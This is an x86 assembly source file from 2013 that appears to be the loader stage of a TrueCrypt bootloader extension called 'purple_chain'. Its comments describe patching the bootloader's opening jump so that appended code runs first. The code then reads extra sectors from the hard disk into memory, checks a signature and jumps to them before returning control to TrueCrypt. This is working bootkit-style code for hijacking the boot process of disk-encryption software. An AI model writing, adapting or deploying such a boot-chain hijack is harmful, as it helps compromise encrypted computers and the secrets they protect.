; ------------------------------------------------------------------------------
; purple_chain - truecrypt bootloader extension               01.2013, armak00ni
; ------------------------------------------------------------------------------
; - file          : purple_load.asm
; - load purple chain
; - this file loads purple_chain 
;   it is appended to the original truecrypt bootloader.
;   since the truecrypt bootloader nicely starts with a
;
;   00000000 e9cf25	jmp	0x25d2 ; this is 0x26d2 in memory since the loader
;                              ; is loaded at 0100.
;
;   we can patch this jmp to the old end of file, and execute us there
;   then from our code we can jmp back to tc_loader_seg:026d2 8]
;
;   we expect to be called from the truecrypt mbr, so we have a stack
;   allready. 

purple_load:
	pusha
	push	es
	push	ds
	
	mov 	ax, 8000h
	mov		es, ax
	mov 	ax, 0206h
	xor 	bx, bx
	mov		cx, 33
	mov		dx, 080h
	int 	13h	
	jc		load_error
	
	cmp 	word [es:3], 0xf001
	jnz		load_error	
	mov		ax, cs
	jmp 	0x8000:0
	
load_error:
	pop		ds
	pop		es
	popa	
	push	0x26d2
	retn

